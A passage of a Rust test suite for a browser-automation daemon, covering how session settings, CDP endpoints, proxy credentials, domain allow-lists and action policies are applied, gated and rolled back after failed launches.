    fs::write(&path, r#"{"default":"deny"}"#).unwrap();
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.policy = None;

    let patch = patch_with(vec![set_to(
        Key::ActionPolicy,
        json!(path.to_str().unwrap()),
    )]);
    apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();

    assert!(state.policy.is_some());
}

#[tokio::test]
async fn test_equal_settings_are_free() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let patch = patch_with(vec![
        set_to(Key::Profile, json!("/tmp/p")),
        set_to(Key::DefaultTimeout, json!(9000)),
    ]);
    apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();

    let again = apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();

    assert!(again.changes.is_empty());
    assert!(!again.relaunched_browser && !again.forced);
}

#[tokio::test]
async fn test_a_launch_change_without_a_browser_is_recorded_not_relaunched() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let patch = patch_with(vec![set_to(Key::Profile, json!("/tmp/p"))]);

    let outcome = apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();

    assert!(!outcome.relaunched_browser);
    assert_eq!(outcome.changes[0]["option"], "profile");
    assert_eq!(outcome.changes[0]["effect"], "relaunch");
    assert_eq!(outcome.changes[0]["applied"], false);
    assert_eq!(
        state.settings.launch_options().profile.as_deref(),
        Some("/tmp/p")
    );
}

#[tokio::test]
async fn test_allowed_domains_change_updates_the_domain_filter() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();

    apply_settings_patch(
        &mut state,
        &patch_with(vec![set_to(Key::AllowedDomains, json!(["a.test"]))]),
        true,
    )
    .await
    .unwrap();
    assert_eq!(current_allowed_domains(&state).await, vec!["a.test"]);

    apply_settings_patch(
        &mut state,
        &patch_with(vec![(Key::AllowedDomains, Requested::Default)]),
        true,
    )
    .await
    .unwrap();
    assert!(state.domain_filter.read().await.is_none());
}

#[tokio::test]
async fn test_a_new_connection_target_drops_the_attached_target() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.attached_target = Some(AttachedTarget::CdpPort(9222));

    apply_settings_patch(
        &mut state,
        &patch_with(vec![set_to(Key::Provider, json!("browserless"))]),
        true,
    )
    .await
    .unwrap();

    assert_eq!(state.attached_target, None);
}

#[tokio::test]
async fn test_command_response_reports_the_settings_it_changed() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let cmd = json!({
        "id": "1",
        "action": "session_info",
        "settings": { "profile": "/tmp/p", "default-timeout": 9000, "proxy-password": "pw" }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], true, "{resp}");
    let changes = resp["data"]["lifecycle"]["settings"]["changes"]
        .as_array()
        .unwrap_or_else(|| panic!("no settings in {resp}"));
    let options: Vec<&str> = changes
        .iter()
        .filter_map(|c| c["option"].as_str())
        .collect();
    // Live settings first; launch settings wait for a command that launches.
    assert_eq!(options, ["default-timeout", "profile", "proxy-password"]);
    assert_eq!(changes[1]["applied"], false);
    assert!(!resp.to_string().contains("\"pw\""), "{resp}");
    assert_eq!(resp["data"]["lifecycle"]["relaunchedBrowser"], false);
}

#[tokio::test]
async fn test_a_command_with_no_settings_has_no_settings_report() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();

    let resp = execute_command(&json!({ "id": "1", "action": "session_info" }), &mut state).await;

    assert_eq!(resp["success"], true, "{resp}");
    assert!(
        resp["data"]["lifecycle"].get("settings").is_none(),
        "{resp}"
    );
}

#[tokio::test]
async fn test_bad_settings_fail_the_command() {
    let (_env, mut state) = isolated_state();
    let cmd = json!({ "id": "1", "action": "session_info", "settings": { "headed": "yes" } });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    assert!(resp["error"].as_str().unwrap().contains("headed"), "{resp}");
}

#[test]
fn test_ca_trust_is_compared_by_content() {
    let a = Some([1u8; 32]);
    let b = Some([2u8; 32]);
    // The same certificates from another path reuse the browser.
    assert_eq!(
        ca_trust_change(Some("/ca-1.pem"), a, "/ca-2.pem", a),
        CaTrustChange::Unchanged
    );
    assert_eq!(
        ca_trust_change(Some("/ca.pem"), a, "/ca.pem", a),
        CaTrustChange::Unchanged
    );
    // The same path with different content is a change.
    assert_eq!(
        ca_trust_change(Some("/ca.pem"), a, "/ca.pem", b),
        CaTrustChange::EditedInPlace
    );
    // A new path with different content, or no trust running, is a change.
    assert_eq!(
        ca_trust_change(Some("/ca-1.pem"), a, "/ca-2.pem", b),
        CaTrustChange::Replaced
    );
    assert_eq!(
        ca_trust_change(None, None, "/ca.pem", a),
        CaTrustChange::Replaced
    );
}
#[tokio::test]
async fn test_cdp_headers_are_not_sent_to_another_endpoint() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let first = patch_with(vec![
        set_to(Key::Cdp, json!("wss://a.example/cdp")),
        set_to(Key::CdpHeaders, json!(r#"{"Authorization":"Bearer a"}"#)),
    ]);
    apply_settings_patch(&mut state, &first, true)
        .await
        .unwrap();
    assert!(cdp_headers_from_settings(&state.settings).is_some());

    let second = patch_with(vec![set_to(Key::Cdp, json!("wss://b.example/cdp"))]);
    apply_settings_patch(&mut state, &second, true)
        .await
        .unwrap();

    assert!(cdp_headers_from_settings(&state.settings).is_none());
}

#[tokio::test]
async fn test_a_command_that_never_launches_leaves_launch_settings_pending() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let patch = patch_with(vec![
        set_to(Key::Profile, json!("/tmp/p")),
        set_to(Key::DefaultTimeout, json!(9000)),
    ]);

    let outcome = apply_settings_patch(&mut state, &patch, false)
        .await
        .unwrap();

    assert_eq!(state.default_timeout_ms, 9000, "live settings still apply");
    assert_eq!(
        state.settings.get(Key::Profile),
        None,
        "launch settings wait"
    );
    assert!(!outcome.relaunched_browser);
    let profile = outcome
        .changes
        .iter()
        .find(|c| c["option"] == "profile")
        .expect("the pending change is reported");
    assert_eq!(profile["applied"], false);
}

#[tokio::test]
async fn test_get_cdp_url_style_commands_do_not_relaunch() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let cmd = json!({
        "id": "1",
        "action": "cdp_url",
        "settings": { "profile": "/tmp/p", "relaunch": true }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(state.settings.get(Key::Profile), None);
    let lifecycle = &resp["data"]["lifecycle"];
    assert_ne!(lifecycle["relaunchedBrowser"], true, "{resp}");
    assert!(state.browser.is_none());
}

#[tokio::test]
async fn test_storage_state_after_a_profile_does_not_wedge_the_session() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.settings.set(Key::Profile, json!("/tmp/inherited"));
    let patch = patch_with(vec![set_to(Key::StorageState, json!("/tmp/s.json"))]);

    apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();

    let options = state.settings.launch_options();
    assert_eq!(options.profile, None);
    assert_eq!(options.storage_state.as_deref(), Some("/tmp/s.json"));
}

#[tokio::test]
async fn test_a_plain_launch_keeps_the_running_profile() {
    // Bare `open` after `--profile` stays on that profile (#2287).
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.settings.set(Key::Profile, json!("/tmp/p"));

    let outcome = apply_settings_patch(&mut state, &Patch::default(), true)
        .await
        .unwrap();

    assert!(outcome.changes.is_empty());
    assert_eq!(
        state.settings.launch_options().profile.as_deref(),
        Some("/tmp/p")
    );
}
#[tokio::test]
async fn test_failed_launch_puts_launch_settings_back_but_keeps_containment() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let cmd = json!({
        "action": "launch",
        "executablePath": "/nonexistent/chrome",
        "allowedDomains": ["example.com"]
    });

    assert!(handle_launch(&cmd, &mut state).await.is_err());

    assert_eq!(
        state.settings.get(Key::ExecutablePath),
        None,
        "the launch setting is put back"
    );
    assert_eq!(
        current_allowed_domains(&state).await,
        vec!["example.com"],
        "a failed launch never widens containment"
    );
    assert_eq!(
        state.settings.security().allowed_domains,
        Some(vec!["example.com".to_string()])
    );
}

#[tokio::test]
async fn test_failed_relaunch_keeps_the_stricter_filter_and_reports_the_rest() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let cmd = json!({
        "id": "1",
        "action": "navigate",
        "url": "about:blank",
        "settings": {
            "allowed-domains": ["example.com"],
            "executable-path": "/nonexistent/chrome"
        }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(state.settings.get(Key::ExecutablePath), None);
    assert_eq!(current_allowed_domains(&state).await, vec!["example.com"]);
    let changes = resp["data"]["lifecycle"]["settings"]["changes"]
        .as_array()
        .expect("a failed response reports the changes");
    let applied = |option: &str| {
        changes
            .iter()
            .find(|c| c["option"] == option)
            .map(|c| c["applied"].clone())
    };
    assert_eq!(applied("executable-path"), Some(json!(false)), "{resp}");
    assert_eq!(applied("allowed-domains"), Some(json!(true)), "{resp}");
}

#[tokio::test]
async fn test_confirmation_gate_leaves_launch_settings_uncommitted() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let cmd = json!({
        "id": "1",
        "action": "navigate",
        "url": "about:blank",
        "settings": { "confirm-actions": "navigate", "profile": "/tmp/p3", "relaunch": true }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
    assert_eq!(state.settings.get(Key::Profile), None, "{resp}");
    assert!(state.confirm_actions.is_some(), "live settings still apply");
    let settings = &resp["data"]["lifecycle"]["settings"];
    let profile = settings["changes"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["option"] == "profile")
        .expect("the pending change is reported");
    assert_eq!(profile["applied"], false);
    assert_ne!(resp["data"]["lifecycle"]["relaunchedBrowser"], true);
}

#[tokio::test]
async fn test_policy_denial_leaves_launch_settings_uncommitted() {
    let dir = tempfile::tempdir().unwrap();
    let policy = dir.path().join("policy.json");
    fs::write(&policy, r#"{"default":"allow","deny":["navigate"]}"#).unwrap();
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let cmd = json!({
        "id": "1",
        "action": "navigate",
        "url": "about:blank",
        "settings": { "action-policy": policy.to_str().unwrap(), "profile": "/tmp/p3" }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false, "{resp}");
    assert!(resp["error"].as_str().unwrap().contains("denied"), "{resp}");
    assert_eq!(state.settings.get(Key::Profile), None);
    assert_eq!(
        resp["data"]["lifecycle"]["settings"]["changes"][1]["applied"],
        false
    );
}

#[tokio::test]
async fn test_local_only_settings_do_not_touch_an_attached_session() {
    for target in [
        (Key::Cdp, json!("ws://127.0.0.1:9999/devtools/browser/x")),
        (Key::Provider, json!("browserless")),
        (Key::AutoConnect, json!(true)),
    ] {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(target.0, target.1);
        let patch = patch_with(vec![
            set_to(Key::Args, json!(["--disable-features=Translate"])),
            set_to(Key::Profile, json!("/tmp/p")),
            set_to(Key::UserAgent, json!("ua")),
        ]);

        let outcome = apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        assert!(!outcome.relaunched_browser);
        assert!(outcome.pending.is_none(), "{:?}", state.settings);
        assert_eq!(outcome.changes.len(), 3);
        assert!(outcome
            .changes
            .iter()
            .all(|c| c["effect"] == "ignored" && c["applied"] == false && c["reason"].is_string()));
        assert_eq!(state.settings.launch_options().profile, None);
    }
}
#[tokio::test]
async fn test_a_launch_rejected_for_containment_is_rejected_whole() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let cmd = json!({
        "action": "launch",
        "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
        "allowedDomains": ["example.com"]
    });

    assert!(handle_launch(&cmd, &mut state).await.is_err());

    assert_eq!(state.settings, Running::defaults());
    assert!(state.domain_filter.read().await.is_none());
}
fn provider_plugins() -> Value {
    json!([
        {
            "name": "browserbox",
            "command": "frob-plugin-browserbox",
            "capabilities": ["browser.provider"]
        },
        {
            "name": "stealth",
            "command": "frob-plugin-stealth",
            "capabilities": ["launch.mutate"]
        }
    ])
}

#[test]
fn test_launch_policy_follows_the_provider_in_settings() {
    let (_env, _) = isolated_state();
    let mut settings = Running::defaults();
    settings.set(Key::Provider, json!("browserbox"));
    let launch = json!({ "action": "launch", "plugins": provider_plugins() });

    let actions = policy_actions_for_command(&launch, "launch", false, None, None, &settings);

    assert!(actions.contains(&"plugin:browserbox:browser.provider".to_string()));
    assert!(!actions.contains(&"plugin:stealth:launch.mutate".to_string()));

    // A local launch still gates the launch mutators.
    let local =
        policy_actions_for_command(&launch, "launch", false, None, None, &Running::defaults());
    assert!(local.contains(&"plugin:stealth:launch.mutate".to_string()));
    assert!(!local.contains(&"plugin:browserbox:browser.provider".to_string()));

    // A named target wins over the settings, and ios has no plugin provider.
    let named = json!({ "action": "launch", "cdpPort": 9222, "plugins": provider_plugins() });
    let actions = policy_actions_for_command(&named, "launch", false, None, None, &settings);
    assert!(!actions.contains(&"plugin:browserbox:browser.provider".to_string()));
    let mut ios = Running::defaults();
    ios.set(Key::Provider, json!("ios"));
    let actions = policy_actions_for_command(&launch, "launch", false, None, None, &ios);
    assert!(!actions.iter().any(|a| a.starts_with("plugin:browserbox")));
}

#[tokio::test]
async fn test_bare_open_with_a_settings_provider_is_gated_by_policy() {
    let dir = tempfile::tempdir().unwrap();
    for (rule, expect_confirmation) in [("deny", false), ("confirm", true)] {
        let policy = dir.path().join(format!("{rule}.json"));
        fs::write(
            &policy,
            format!(r#"{{"{rule}": ["plugin:browserbox:browser.provider"]}}"#),
        )
        .unwrap();
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "id": "1",
            "action": "launch",
            "plugins": provider_plugins(),
            "settings": {
                "provider": "browserbox",
                "action-policy": policy.to_str().unwrap()
            }
        });

        let resp = execute_command(&cmd, &mut state).await;

        if expect_confirmation {
            assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
            assert_eq!(resp["data"]["action"], "plugin:browserbox:browser.provider");
        } else {
            assert_eq!(resp["success"], false, "{resp}");
            assert!(
                resp["error"].as_str().unwrap().contains("denied by policy"),
                "{resp}"
            );
        }
        assert!(state.browser.is_none(), "the plugin must not run: {resp}");
        assert_eq!(state.settings.get(Key::Provider), None, "{resp}");
    }
}
#[tokio::test]
async fn test_changed_cdp_headers_replace_the_cached_ones_for_the_endpoint() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let endpoint = "wss://a.example/cdp";
    let first = patch_with(vec![
        set_to(Key::Cdp, json!(endpoint)),
        set_to(Key::CdpHeaders, json!(r#"{"Authorization":"Bearer one"}"#)),
    ]);
    apply_settings_patch(&mut state, &first, true)
        .await
        .unwrap();
    assert_eq!(
        cdp_headers_for(&state, endpoint),
        Some(vec![(
            "Authorization".to_string(),
            "Bearer one".to_string()
        )])
    );

    let changed = patch_with(vec![set_to(
        Key::CdpHeaders,
        json!(r#"{"Authorization":"Bearer two"}"#),
    )]);
    apply_settings_patch(&mut state, &changed, true)
        .await
        .unwrap();
    assert_eq!(
        cdp_headers_for(&state, endpoint),
        Some(vec![(
            "Authorization".to_string(),
            "Bearer two".to_string()
        )])
    );

    let cleared = patch_with(vec![(Key::CdpHeaders, Requested::Default)]);
    apply_settings_patch(&mut state, &cleared, true)
        .await
        .unwrap();
    assert_eq!(cdp_headers_for(&state, endpoint), None);
    assert_eq!(state.cdp_headers, None);
}
#[tokio::test]
async fn test_an_unreadable_state_file_fails_the_command_and_keeps_the_settings() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.settings.set(Key::Profile, json!("/tmp/previous"));
    let cmd = json!({
        "id": "1",
        "action": "navigate",
        "url": "about:blank",
        "settings": { "storage-state": "/nonexistent/state.json" }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(state.settings.get(Key::StorageState), None, "{resp}");
    assert_eq!(
        state.settings.get(Key::Profile),
        Some(&json!("/tmp/previous"))
    );
    assert!(state.browser.is_none(), "the failed launch is closed");
}
#[tokio::test]
async fn test_a_live_default_timeout_updates_the_stored_config() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.session_id = "timeout-sync".to_string();
    let config = SessionFile::Config.path("timeout-sync");
    fs::create_dir_all(config.parent().unwrap()).unwrap();
    fs::write(&config, r#"{"debug":false,"default_timeout":90000}"#).unwrap();

    let patch = patch_with(vec![set_to(Key::DefaultTimeout, json!(5000))]);
    apply_settings_patch(&mut state, &patch, false)
        .await
        .unwrap();

    assert_eq!(
        crate::connection::running_daemon_default_timeout("timeout-sync"),
        Some(5000)
    );
}
#[test]
fn test_policy_follows_a_provider_switched_through_settings() {
    let (_env, _) = isolated_state();
    let attached = AttachedTarget::CdpPort(9222);
    let mut settings = Running::defaults();
    settings.set(Key::Provider, json!("browserbox"));
    let navigate = json!({ "action": "navigate", "url": "https://example.com", "plugins": provider_plugins() });
    let launch = json!({ "action": "launch", "plugins": provider_plugins() });

    for (cmd, action, implicit) in [(&navigate, "navigate", true), (&launch, "launch", false)] {
        let actions =
            policy_actions_for_command(cmd, action, implicit, Some(&attached), None, &settings);
        assert!(
            actions.contains(&"plugin:browserbox:browser.provider".to_string()),
            "{action}: {actions:?}"
        );
    }
    // Without a settings target the attachment still decides.
    let attached = AttachedTarget::Provider("browserbox".to_string());
    let actions = policy_actions_for_command(
        &navigate,
        "navigate",
        true,
        Some(&attached),
        None,
        &Running::defaults(),
    );
    assert!(actions.contains(&"plugin:browserbox:browser.provider".to_string()));
}

#[tokio::test]
async fn test_switching_an_attached_session_to_a_provider_is_gated_by_policy() {
    let dir = tempfile::tempdir().unwrap();
    for (rule, expect_confirmation) in [("deny", false), ("confirm", true)] {
        let policy = dir.path().join(format!("{rule}.json"));
        fs::write(
            &policy,
            format!(r#"{{"{rule}": ["plugin:browserbox:browser.provider"]}}"#),
        )
        .unwrap();
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::Cdp, json!("9222"));
        state.attached_target = Some(AttachedTarget::CdpPort(9222));
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "plugins": provider_plugins(),
            "settings": {
                "provider": "browserbox",
                "action-policy": policy.to_str().unwrap()
            }
        });

        let resp = execute_command(&cmd, &mut state).await;

        if expect_confirmation {
            assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
            assert_eq!(resp["data"]["action"], "plugin:browserbox:browser.provider");
        } else {
            assert!(
                resp["error"].as_str().unwrap().contains("denied by policy"),
                "{resp}"
            );
        }
        assert!(state.browser.is_none(), "the provider must not run: {resp}");
        assert_eq!(state.settings.get(Key::Provider), None, "{resp}");
        assert_eq!(state.settings.get(Key::Cdp), Some(&json!("9222")));
        assert_eq!(state.attached_target, Some(AttachedTarget::CdpPort(9222)));
    }
}

#[tokio::test]
async fn test_bare_open_with_an_unreadable_state_file_fails() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.settings.set(Key::Profile, json!("/tmp/previous"));
    let cmd = json!({
        "id": "1",
        "action": "launch",
        "settings": { "storage-state": "/nonexistent/state.json" }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(state.settings.get(Key::StorageState), None, "{resp}");
    assert_eq!(
        state.settings.get(Key::Profile),
        Some(&json!("/tmp/previous"))
    );
    assert!(state.browser.is_none(), "the failed launch is closed");
}
#[tokio::test]
async fn test_failed_attach_from_the_spawn_env_does_not_stick() {
    let cases = [
        ("FROB_CDP", "invalid-cdp-target", "cdp"),
        ("FROB_PROVIDER", "not-a-provider-for-test", "provider"),
    ];
    for (var, value, key) in cases {
        let names = [
            "FROB_CDP",
            "FROB_CDP_HEADERS",
            "FROB_AUTO_CONNECT",
            "FROB_PROVIDER",
            "FROB_EXECUTABLE_PATH",
            "FROB_ENGINE",
            "FROB_PROFILE",
            "FROB_STATE",
            "FROB_SESSION_NAME",
            "FROB_SOCKET_DIR",
        ];
        let guard = EnvGuard::new(&names);
        for name in names {
            guard.remove(name);
        }
        let dir = tempfile::tempdir().unwrap();
        guard.set("FROB_SOCKET_DIR", dir.path().to_str().unwrap());
        guard.set(var, value);
        guard.set("FROB_EXECUTABLE_PATH", "/nonexistent/chrome");
        let mut state = DaemonState::new();

        let first = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "settings": { key: value }
        });
        let resp = execute_command(&first, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(state.settings.connection(), Connection::Local, "{resp}");

        let plain = json!({ "id": "2", "action": "navigate", "url": "about:blank" });
        let resp = execute_command(&plain, &mut state).await;
        let error = resp["error"].as_str().unwrap_or_default();
        assert!(
            error.contains("Auto-launch failed") || error.contains("nonexistent"),
            "{var}: a plain command must launch locally: {resp}"
        );
        assert!(!error.contains("CDP connection failed"), "{var}: {resp}");
        assert!(!error.contains("not-a-provider-for-test"), "{var}: {resp}");
    }
}

#[tokio::test]
async fn test_resetting_auto_connect_returns_the_session_to_a_local_launch() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.settings.set(Key::AutoConnect, json!(true));
    state.attached_target = Some(AttachedTarget::AutoConnect);
    let patch = patch_with(vec![(Key::AutoConnect, Requested::Default)]);

    let outcome = apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();

    assert_eq!(state.settings.connection(), Connection::Local);
    assert_eq!(state.attached_target, None);
    assert!(outcome.pending.is_some(), "the local launch is pending");
    assert_eq!(outcome.changes.len(), 1);
    assert_eq!(outcome.changes[0]["option"], "auto-connect");
    assert_eq!(outcome.changes[0]["requested"], Value::Null);
    assert_eq!(outcome.changes[0]["running"], json!(true));
}

#[tokio::test]
async fn test_failed_local_launch_after_an_auto_connect_reset_restores_the_target() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.settings.set(Key::AutoConnect, json!(true));
    state.attached_target = Some(AttachedTarget::AutoConnect);
    let cmd = json!({
        "id": "1",
        "action": "navigate",
        "url": "about:blank",
        "settings": { "auto-connect": null, "executable-path": "/nonexistent/chrome" }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(state.settings.connection(), Connection::AutoConnect);
    assert_eq!(state.attached_target, Some(AttachedTarget::AutoConnect));
}

#[tokio::test]
async fn test_resetting_to_a_local_launch_gates_the_launch_mutators() {
    let dir = tempfile::tempdir().unwrap();
    let policy = dir.path().join("deny.json");
    fs::write(&policy, r#"{"deny": ["plugin:stealth:launch.mutate"]}"#).unwrap();
    // `-p ""` and a raw null both reset the session to a local launch.
    for reset in [json!({ "provider": "" }), json!({ "cdp": null })] {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::Cdp, json!("9222"));
        state.attached_target = Some(AttachedTarget::CdpPort(9222));
        let mut settings = reset.clone();
        settings["action-policy"] = json!(policy.to_str().unwrap());
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "plugins": provider_plugins(),
            "settings": settings
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert!(
            resp["error"]
                .as_str()
                .is_some_and(|e| e.contains("denied by policy")),
            "{reset}: {resp}"
        );
        assert!(state.browser.is_none());
        assert_eq!(
            state.settings.get(Key::Cdp),
            Some(&json!("9222")),
            "not committed"
        );
    }
}

#[test]
fn test_an_empty_provider_names_no_browser() {
    let mut settings = Running::defaults();
    settings.set(Key::Provider, json!(""));
    assert_eq!(settings.connection(), Connection::Local);
    assert!(settings_launch_target(&settings).is_none());
}

#[tokio::test]
async fn test_an_external_launch_installs_no_proxy_credentials() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    // Inherited local launch settings that a stale session could carry.
    state.settings.set(Key::ProxyUsername, json!("user"));
    state.settings.set(Key::ProxyPassword, json!("pw"));
    state
        .settings
        .set(Key::StorageState, json!("/tmp/state.json"));
    state.settings.set(Key::Cdp, json!("1"));
    *state.proxy_credentials.write().await = Some(("old".to_string(), "old".to_string()));

    // Nothing listens on port 1, so the attach fails; the credentials are
    // decided before it is tried.
    assert!(auto_launch(&mut state, Vec::new()).await.is_err());

    assert!(state.proxy_credentials.read().await.is_none());
}

#[tokio::test]
async fn test_switching_to_an_external_browser_drops_inherited_local_settings() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state
        .settings
        .set(Key::StorageState, json!("/tmp/state.json"));
    state.settings.set(Key::ProxyUsername, json!("user"));
    state.settings.set(Key::ProxyPassword, json!("pw"));

    let patch = patch_with(vec![set_to(Key::Cdp, json!("ws://127.0.0.1:9999/x"))]);
    let outcome = apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();

    let options = state.settings.launch_options();
    assert_eq!(options.storage_state, None);
    assert_eq!(options.proxy_username, None);
    assert_eq!(options.proxy_password, None);
    let dropped: Vec<&str> = outcome
        .changes
        .iter()
        .filter(|c| c["effect"] == "ignored")
        .filter_map(|c| c["option"].as_str())
        .collect();
    assert!(dropped.contains(&"storage-state") && dropped.contains(&"proxy-password"));
}
#[test]
fn test_blank_targets_name_no_browser_anywhere() {
    for cmd in [
        json!({ "action": "launch", "cdpUrl": "" }),
        json!({ "action": "launch", "cdpUrl": "  " }),
        json!({ "action": "launch", "cdpPort": 0 }),
        json!({ "action": "launch", "provider": " " }),
        json!({ "action": "launch", "autoConnect": false }),
    ] {
        assert_eq!(AttachedTarget::named_by(&cmd), None, "{cmd}");
        assert_eq!(AttachedTarget::from_launch_command(&cmd), None, "{cmd}");
        assert!(launch_envelope_patch(&cmd, None).is_noop(), "{cmd}");
    }
    let mut settings = Running::defaults();
    settings.set(Key::Cdp, json!(" "));
    settings.set(Key::Provider, json!(""));
    assert_eq!(settings.connection(), Connection::Local);
    assert!(settings_launch_target(&settings).is_none());
}

#[tokio::test]
async fn test_a_launch_with_a_blank_cdp_url_is_gated_as_local() {
    let dir = tempfile::tempdir().unwrap();
    let policy = dir.path().join("deny.json");
    fs::write(&policy, r#"{"deny": ["plugin:stealth:launch.mutate"]}"#).unwrap();
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let cmd = json!({
        "id": "1",
        "action": "launch",
        "cdpUrl": "",
        "plugins": provider_plugins(),
        "settings": { "action-policy": policy.to_str().unwrap() }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert!(
        resp["error"]
            .as_str()
            .is_some_and(|e| e.contains("denied by policy")),
        "{resp}"
    );
    assert!(state.browser.is_none());
    assert_eq!(state.attached_target, None);
}

#[tokio::test]
async fn test_a_failed_switch_to_an_external_target_keeps_the_local_settings() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    let before = [
        (Key::StorageState, json!("/tmp/state.json")),
        (Key::Proxy, json!("http://proxy:8080")),
        (Key::ProxyUsername, json!("user")),
        (Key::ProxyPassword, json!("pw")),
    ];
    for (key, value) in &before {
        state.settings.set(*key, value.clone());
    }
    // State the attempt replaces: the switch drops the attached target and
    // the endpoint's headers, and clearing CA trust drops the bundle.
    state.settings.set(Key::CaCert, json!("/tmp/ca.pem"));
    state.effective_ca_cert = Some(EffectiveCaCert {
        path: "/tmp/ca.pem".to_string(),
        bundle: crate::ca_bundle::test_bundle(b"ca"),
    });
    state.attached_target = Some(AttachedTarget::CdpPort(9222));
    state.cdp_headers = Some((
        "9222".to_string(),
        vec![("Authorization".to_string(), "Bearer a".to_string())],
    ));
    let cmd = json!({
        "id": "1",
        "action": "navigate",
        "url": "about:blank",
        "settings": { "cdp": "1", "clear-ca-cert": true }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(state.settings.get(Key::Cdp), None);
    for (key, value) in &before {
        assert_eq!(state.settings.get(*key), Some(value), "{key:?}");
    }
    assert_eq!(
        state.effective_ca_cert.as_ref().map(|ca| ca.path.as_str()),
        Some("/tmp/ca.pem")
    );
    assert!(matches!(
        state.attached_target,
        Some(AttachedTarget::CdpPort(9222))
    ));
    assert_eq!(
        state.cdp_headers,
        Some((
            "9222".to_string(),
            vec![("Authorization".to_string(), "Bearer a".to_string())],
        ))
    );
}

#[test]
fn test_an_inherited_engine_does_not_label_an_attached_browser() {
    let mut settings = Running::defaults();
    settings.set(Key::Engine, json!("lightpanda"));
    // CDP and auto-connect drop it; a plugin provider keeps it.
    for target in [
        (Key::Cdp, json!("ws://127.0.0.1:9999/x")),
        (Key::AutoConnect, json!(true)),
    ] {
        let plan = settings.plan(&patch_with(vec![set_to(target.0, target.1)]));
        assert_eq!(plan.next.engine(), None);
    }
    let plan = settings.plan(&patch_with(vec![set_to(
        Key::Provider,
        json!("browserbox"),
    )]));
    assert_eq!(plan.next.engine().as_deref(), Some("lightpanda"));
}

#[tokio::test]
async fn test_attaching_over_cdp_never_labels_the_browser_with_the_engine() {
    let (_env, mut state) = isolated_state();
    state.settings = Running::defaults();
    state.settings.set(Key::Engine, json!("lightpanda"));
    state.settings.set(Key::Cdp, json!("1"));

    // Nothing listens on port 1; the label is set before the attach.
    assert!(auto_launch(&mut state, Vec::new()).await.is_err());

    assert_eq!(state.engine, "chrome");
}

// === Security settings kept across daemon restarts ===

use crate::session_settings::{FsStore, MemStore, SecurityView, StoreError};
use std::sync::atomic::{AtomicUsize, Ordering};

/// A store that counts saves and can start failing them.
struct FlakyStore {
    inner: MemStore,
    saves: AtomicUsize,
    fail_from: usize,
}

impl FlakyStore {
    fn new(fail_from: usize) -> Arc<FlakyStore> {
        Arc::new(FlakyStore {
            inner: MemStore::default(),
